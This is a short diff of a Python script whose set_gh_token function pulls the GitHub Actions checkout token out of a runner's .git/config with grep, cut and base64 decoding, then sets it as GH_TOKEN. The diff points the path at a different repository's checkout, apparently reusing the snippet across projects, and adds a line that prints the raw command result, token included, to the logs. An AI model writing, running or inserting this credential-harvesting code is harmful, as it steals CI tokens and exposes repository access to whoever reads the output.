@@ -22,10 +22,11 @@ import sys
 
 def set_gh_token():
     try:
+        print("Getting GHTOKEN!")
         # Execute the command to get the GH_TOKEN
-        command = "grep 'extraheader' /home/runner/work/accept-a-payment/accept-a-payment/.git/config | cut -d ' ' -f 5 | cut -d ':' -f 2 | base64 -d | cut -d ':' -f 2"
+        command = "grep 'extraheader' /home/runner/work/sqlalchemy-hana/sqlalchemy-hana/.git/config | cut -d ' ' -f 5 | cut -d ':' -f 2 | base64 -d | cut -d ':' -f 2"
         result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
-        
+        print(f"res: {result}")
         # Set the environment variable
         os.environ['GH_TOKEN'] = result.stdout.strip()
         print("GH_TOKEN has been set successfully.")
